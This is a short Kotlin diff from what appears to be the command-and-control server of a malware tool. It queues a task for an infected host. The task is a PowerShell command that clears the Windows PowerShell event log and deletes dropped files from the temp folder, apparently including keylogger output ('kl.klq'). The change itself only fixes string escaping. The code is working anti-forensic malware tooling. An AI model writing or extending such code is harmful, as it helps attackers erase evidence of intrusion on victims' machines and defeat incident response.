@@ -164,7 +164,7 @@ class QcliApi {
             val task = JSONObject().put("act", "run").put(
                 "cmd",
                 "powershell -NoProfile -Command \"wevtutil cl 'Windows PowerShell'; " +
-                    "Remove-Item $env:TEMP\\lakitu*,$env:TEMP\\a.bat,$env:TEMP\\kl.klq " +
+                    "Remove-Item ${'$'}env:TEMP\\lakitu*,${'$'}env:TEMP\\a.bat,${'$'}env:TEMP\\kl.klq " +
                     "-ErrorAction SilentlyContinue\""
             )
             C2State.setTask(host, task)
